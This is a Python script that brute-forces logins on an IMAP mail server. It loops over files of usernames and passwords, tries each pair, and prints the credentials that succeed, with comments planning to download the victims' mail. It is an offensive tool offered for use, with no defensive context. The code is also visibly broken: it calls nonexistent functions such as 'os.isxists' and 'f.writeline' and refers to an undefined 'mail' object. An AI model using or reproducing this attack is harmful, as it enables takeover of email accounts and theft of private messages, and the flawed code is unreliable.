import base64
import os
import email
import imaplib
import argparse


def checkfolder(folder: str) -> None:
    #if folers not there make it
    if os.isxists is False:
        os.mkdir(folder)

def connectserver(usr: str, passw: str, host: str, port: str):
    mail = imaplib.IMAP4_SSL(host, int(port))
    try:
        mail.login(usr, passw)
        rt = mail
    except:
        rt = None
    return rt

def writelog(fname: str, msg: str) -> None:
    with open(fname, 'a') as f:
        f.writeline(msg)

def readfile(fname: str) -> list:
    with open(fname, 'r') as f:
        return f.readlines()

def main(passfile: str, usrfile: str, host: str, port: str) -> None:
    passw = readfile(passfile)
    usrn = readfile(usrfile)
    for usr in usrn:
        usr = usr.strip()
        for p in passw:
            p = p.strip()
            #todo connect to email server
            r = connectserver(usr, p, host, port)
            if r is not None:
                #download emails
                for mf in mail.list[1]:
                    checkfolder(mf)
                    print(mf)
                msg = "Logging found for user {} & pass {} on host {}:{}".format(usr, p, host, port)
                print(msg)
                #TODO download emails if you can login, maybe option for this
            else:
                msg = "Failed to connect to Host:{}:{} with user {} and pass {}".format(host, port, usr, p)
                print(msg)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--passw", dest="passw", help="filename with passwords", type=str, nargs=1, required=True)
    parser.add_argument("--users", dest="users", help="filename with usernames", type=str, nargs=1, required=True)
    parser.add_argument("--host", dest="host", help="hostname or ip", type=str, nargs=1, required=True)
    parser.add_argument("--port", dest="port", help="port", type=str, nargs=1, required=True)
    args = parser.parse_args()
    main(args.passw[0], args.users[0], args.host[0], args.port[0])

